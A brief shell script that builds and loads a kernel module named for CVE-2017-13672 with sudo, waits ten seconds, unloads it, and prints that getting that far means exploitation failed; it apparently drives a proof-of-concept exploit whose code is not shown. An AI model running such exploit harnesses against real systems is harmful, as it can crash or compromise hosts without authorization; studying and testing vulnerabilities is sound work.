#!/bin/sh

make
echo "Loading..."
sudo insmod CVE-2017-13672.ko
sleep 10
echo "Unloading..."
sudo rmmod CVE-2017-13672.ko
echo "If you got this far, exploitation was unsuccessful :("
